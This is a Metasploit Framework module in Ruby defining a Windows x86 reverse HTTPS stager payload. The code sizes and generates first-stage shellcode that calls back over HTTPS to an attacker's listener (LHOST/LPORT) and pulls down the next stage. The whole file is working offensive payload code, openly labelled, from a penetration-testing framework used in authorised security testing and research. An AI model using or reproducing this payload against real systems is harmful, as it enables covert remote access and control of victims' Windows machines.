##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'
require 'msf/core/handler/reverse_https'
require 'msf/core/payload/windows/reverse_https'


module Metasploit3

  include Msf::Payload::Stager
  include Msf::Payload::Windows
  include Msf::Payload::Windows::ReverseHttps

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Reverse HTTPS Stager',
      'Description'   => 'Tunnel communication over HTTP using SSL',
      'Author'        => 'hdm',
      'License'       => MSF_LICENSE,
      'Platform'      => 'win',
      'Arch'          => ARCH_X86,
      'Handler'       => Msf::Handler::ReverseHttps,
      'Convention'    => 'sockedi https'))
  end

  #
  # Do not transmit the stage over the connection.  We handle this via HTTPS
  #
  def stage_over_connection?
    false
  end

  #
  # Generate the first stage
  #
  def generate

    # Generate the simple version of this stager if we don't have enough space
    if self.available_space.nil? || required_space > self.available_space
      return generate_reverse_https(
        host: datastore['LHOST'],
        port: datastore['LPORT'],
        url:  "/" + generate_uri_checksum(Msf::Handler::ReverseHttps::URI_CHECKSUM_INITW),
        ssl:  true)
    end

    # Maximum URL is limited to https:// plus 256 bytes, figure out our maximum URI
    uri_max_len = 256 - "#{datastore['LHOST']}:#{datastore['LPORT']}/".length
    uri = generate_uri_checksum(Msf::Handler::ReverseHttps::URI_CHECKSUM_INITW, 30 + rand(uri_max_len-30))

    conf = {
      ssl:  true,
      host: datastore['LHOST'],
      port: datastore['LPORT'],
      url:  "/#{uri}",
      exitfunk: datastore['EXITFUNC']
    }

    generate_reverse_https(conf)
  end

  # TODO: Use the CachedSize instead
  def cached_size
    341
  end

  #
  # Determine the maximum amount of space required for the features requested
  #
  def required_space
    # Start with our cached default generated size
    space = cached_size

    # Add 100 bytes for the encoder to have some room
    space += 100

    # Add 251 bytes for large URI support (technically a little less, but lets go with it)
    space += 251

    # EXITFUNK processing adds 31 bytes at most (for ExitThread, only ~16 for others)
    space += 31

    # The final estimated size
    space
  end

  #
  # Always wait at least 20 seconds for this payload (due to staging delays)
  #
  def wfs_delay
    20
  end
end
